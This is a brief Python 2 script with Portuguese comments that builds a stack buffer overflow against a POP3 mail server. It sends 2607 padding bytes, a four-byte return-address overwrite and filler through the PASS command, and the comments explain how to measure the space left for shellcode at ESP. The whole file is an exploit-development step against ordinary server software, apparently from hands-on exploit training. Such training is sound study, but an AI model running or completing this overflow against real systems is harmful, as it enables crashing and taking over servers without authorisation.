#!/usr/bin/python

import socket

#bytes = 'A' * 2606 + 'BBCC'
#bytes = 'A' * 2607 + 'BBCC'

#Agora vamos verificar a quantidade de espaco pro shell code 
bytes = 'A' * 2607 + 'BBBB' + 'C' * (3000 - 2611)

#O espaco do shellcode e o registrador ESP e pode ser optido pela diferenca de quanto a aplicaca quebra (3000) e a quantidade de bytes enviados (2611)
#Geralmente um payload possui 349-400 bytes

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.connect(('192.168.0.104',110))
	r = s.recv(1024)
	print r

	s.send('USER teste\r\n')
	r = s.recv(1024)
	print r

	s.send('PASS' + bytes + '\r\n')
	r = s.recv(1024)
	print r


	s.send('QUIT\r\n')
	r = s.recv(1024)
	print r

except:
	print "Erro ao conectar"		
